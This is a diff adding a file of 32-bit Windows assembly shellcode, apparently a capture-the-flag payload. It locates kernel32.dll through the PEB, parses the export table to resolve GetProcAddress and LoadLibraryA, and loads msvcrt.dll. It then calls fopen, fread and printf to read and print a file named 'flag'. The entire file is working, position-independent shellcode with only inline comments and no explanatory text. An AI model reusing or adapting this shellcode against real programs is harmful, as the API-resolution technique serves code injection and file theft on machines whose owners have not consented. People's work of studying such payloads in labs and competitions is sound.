@@ -1,0 +1,145 @@
+xor ecx,ecx
+mov eax,[fs:ecx+0x30] ;EAX=PEB
+mov eax,[eax+0xc] ;EAX=PEB->Ldr
+mov esi,[eax+0x14] ;ESI=PEB->Ldr.InMemOrderModuleList
+lodsd ; EAX=ntdll.dll
+xchg eax,esi ;EAX=ESI , ESI=EAX
+lodsd ; EAX=Third(kernel32)
+mov ebx,[eax+0x10] ;PVOID Dllbase (base address)
+ 
+;-------------------------------
+ 
+mov edx,[ebx+0x3c] ;(kernel32.dll base address+0x3c)=DOS->e_lfanew
+add edx,ebx ;(DOS->e_lfanew+kernel32.dll base address)=PE Header
+mov edx,[edx+0x78] ;(PE Header+0x78)=DataDirectory->VirtualAddress
+add edx,ebx ;(DataDirectory->VirtualAddress+kernel32.dll base address)=export table of kernel32.dll(IMAGE_EXPORT_DIRECTORY)
+mov esi,[edx+0x20]; (IMAGE_EXPORT_DIRECTORY+0x20)=AddressOfNames
+add esi,ebx ;ESI=(AddressOfNames+kernel32.dll base address)=kernel32 AddressOfNames
+xor ecx,ecx
+;-----------------------
+ 
+Get_func:
+inc ecx ;increment the ordinal
+lodsd ;Get name offset
+add eax,ebx ;(offset+kernel32.dll base adress)=Get function name
+cmp dword [eax],0x50746547 ;GetP
+jnz Get_func
+cmp dword [eax+0x4],0x41636f72 ;rocA
+jnz Get_func
+cmp dword [eax+0x8],0x65726464 ;ddre
+jnz Get_func
+ 
+;---------------------
+ 
+mov esi,[edx+0x24] ;(IMAGE_EXPORT_DIRECTORY+0x24) AddressOfNameOrdinals
+ 
+add esi,ebx ;ESI=(AddressOfNameOrdinals+kernel32.dll)=AddressOfNameOrdinals of kernel32.dll
+ 
+mov cx,[esi+ecx*2] ;CX=Number of Function
+dec ecx
+mov esi,[edx+0x1c] ; (IMAGE_EXPORT_DIRECTORY+0x1c)=AddressOfFunctions
+ 
+add esi,ebx ;ESI=beginning of Address table
+mov edx,[esi+ecx*4];EDX=Pointer(offset)
+add edx,ebx ;Edx=GetProcAddress
+ 
+ 
+;------------------------------
+ 
+xor esi,esi
+mov esi,edx
+;-------------------------------
+;finding address of LoadLibraryA
+xor ecx,ecx
+push ecx
+push 0x41797261
+push 0x7262694c
+push 0x64616f4c
+ 
+mov ecx,esp
+ 
+push ecx
+push ebx
+ 
+call edx
+ 
+;-------------------------------------
+;finding address of msvcrt.dll
+xor ecx,ecx
+mov cx, 0x6c6c
+push ecx
+push 0x642e7472
+push 0x6376736d
+mov ecx,esp
+push ecx
+call eax
+;----------------------------
+ 
+xor edi,edi
+mov edi,eax ; base address of msvcrt.dll
+;----------------------------
+; 0a 66 74 6e 69 72 70
+;finding address of fopen()
+xor edx,edx
+push edx
+mov dx, 0x6e
+push edx
+push 0x65706f66
+mov ecx,esp
+push ecx
+push edi
+xor edx,edx
+mov edx,esi
+call edx
+;-------------------------
+ 
+xor ecx,ecx
+push ecx
+push 0x67616c66
+mov ecx,esp
+xor ebx,ebx
+mov bl, 0x72
+push ebx
+mov ebx, esp
+push ecx
+push ebx
+call eax            ;calling fopen("flag", "r")
+
+mov ebx, eax        ;ebx contain file handler
+
+;finding address of fread() 
+xor ecx,ecx
+mov cl,0x64
+push ecx
+push 0x61657266
+mov ecx,esp
+push ecx
+push edi
+xor edx,edx
+mov edx,esi
+call edx
+
+sub esp, 0x40
+mov ecx, esp
+
+push ebx
+xor ebx,ebx
+inc ebx
+push ebx
+shl ebx, 6
+push ecx
+call eax ;calling readf()
+
+;finding address of printf()
+xor edx,edx
+mov dx, 0x6674
+push edx
+push 0x6e697270
+mov ebx,esp
+push ebx
+push edi
+call esi
+
+push ecx
+call eax ;Calling printf
+ 
